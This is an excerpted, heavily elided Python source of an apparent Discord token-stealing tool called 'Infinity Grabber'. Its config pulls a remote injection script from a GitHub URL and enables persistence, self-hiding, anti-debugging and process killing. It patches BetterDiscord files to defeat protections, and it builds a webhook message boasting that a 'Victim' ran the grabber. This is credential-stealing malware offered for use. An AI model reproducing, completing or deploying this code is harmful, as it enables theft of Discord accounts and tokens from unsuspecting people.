...
__config__ = {
    ...
    'injection_url': "https://raw.githubusercontent.com/xptgr/images/main/scripts/injection/injection.js",
    'kill_processes': True,
    'startup': True,
    'hide_self': True,
    'anti_debug': True,
    ...
    async def bypassBetterDiscord(self):
        ...
        if ntpath.exists(bd):
            ...
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'Infinity')
...
{line_sep}
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("🌟・By Infinity・https://dsc.gg/unlimitedness\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x + "\n\n🌟・By Infinity・https://dsc.gg/unlimitedness")
        ...
        embed = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/963257711271768084/986312208168407080/unknown.png',
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Infinity Grabber LUL',
                        'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                        'icon_url': 'https://cdn.discordapp.com/attachments/963257711271768084/986312208168407080/unknown.png'
                    },
                    'color': 176185,
                    ...
                    'footer': {
                        'text': '🌟・By Infinity・https://dsc.gg/unlimitedness'
                    }
                }
            ]
        }
